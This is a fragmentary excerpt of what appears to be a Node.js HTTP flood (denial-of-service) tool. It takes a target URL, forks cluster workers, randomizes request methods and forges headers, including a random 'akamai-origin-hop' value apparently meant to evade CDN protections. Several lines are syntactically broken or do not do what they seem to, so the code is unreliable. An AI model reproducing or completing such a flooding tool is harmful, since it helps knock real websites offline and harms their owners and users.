...
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd",
 ...
 var randomMethod1 = Methods[Math.floor(Math.random() * Methods.length)]; 
 ...
 const parsedTarget = url.parse(args.target);
      ...
      if (cluster.isMaster) {
        ...
        console.log("Headers Method: GET, "+ randomMethod +", " +randomMethod1);
      } else {
 ...
 const rateHeaders = [
    ...
    {"Access-Control-Request-Method": "GET", randomMethod, randomMethod1},
    {"dnt" : "1" },
    ];
    const rateHeaders2 = [
    { "akamai-origin-hop": randstr(5)  },
 ...
 headers[":method"] = "GET", randomMethod, randomMethod1;
